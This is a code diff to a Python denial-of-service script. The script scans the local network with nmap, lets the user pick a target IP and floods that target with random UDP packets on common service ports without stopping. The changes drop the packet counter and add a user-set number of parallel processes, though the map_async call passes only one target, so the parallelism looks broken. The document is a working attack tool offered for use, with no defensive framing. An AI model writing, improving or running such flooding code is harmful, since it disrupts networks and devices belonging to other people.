@@ -2,7 +2,7 @@ import socket
 import random
 import sys
 import subprocess
-from multiprocessing import Pool
+from multiprocessing import Pool, Process
 
 def get_hostname(ip):
     try:
@@ -22,12 +22,10 @@ def start_attack(ip):
     sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
     package = random._urandom(1024)
     ports = {21, 22, 23, 24, 25, 26, 27, 80, 143, 443}
-    n = 1
     while True:
         for port in ports:
             sock.sendto(package, (ip, port))
-        print("Sent \033[4;31m%d\033[0m packets to %s" % (n, ip))
-        n += 1
+
 
 if __name__ == "__main__":
     print("\033[4;31mScanning network...\033[0m\n")
@@ -54,15 +52,25 @@ if __name__ == "__main__":
         print("\033[4;31mError: nmap command not found.\033[0m")
         sys.exit()
 
-    # Allow input of letters that correspond to the list and numbers as the last number of an IP address
-    custom_ip = input("\nEnter the \033[4;31mID\033[0m or the last three digits of the \033[4;31mIP\033[0m address you want to flood: ")
-    if custom_ip.isdigit():
-        target_ip = "192.168.1." + custom_ip
-    elif custom_ip.isalpha() and ord(custom_ip) - ord('a') < len(ip_list):
-        target_ip = ip_list[ord(custom_ip) - ord('a')]
-    else:
-        print("Invalid input")
-        sys.exit()
-    print("Starting \n\033[4;31mDoS\033[0m attack on %s..." % target_ip)
-    for i in range(10):
-        start_attack(target_ip)
+    try:
+        custom_ip = input("\nEnter the \033[4;31mID\033[0m or the last three digits of the \033[4;31mIP\033[0m address you want to flood:  ")
+        num = int(input("Enter the number of simultaneous \033[4;31mprocesses\033[0m you want to run:  "))
+        if custom_ip.isdigit():
+            target_ip = "192.168.1." + custom_ip
+        elif custom_ip.isalpha() and ord(custom_ip) - ord('a') < len(ip_list):
+            target_ip = ip_list[ord(custom_ip) - ord('a')]
+        else:
+            print("Invalid input")
+            sys.exit()
+        print("\nStarting \033[4;31mDoS\033[0m attack on %s..." % target_ip)
+        
+        pool = Pool(processes=num)
+        pool.map_async(start_attack, [target_ip])
+
+        while True:
+            pass
+
+    except KeyboardInterrupt:
+        print("Caught \033[4;31mKeyboardInterrupt\033[0m, stopping attacks...")
+        pool.terminate()
+        pool.join()
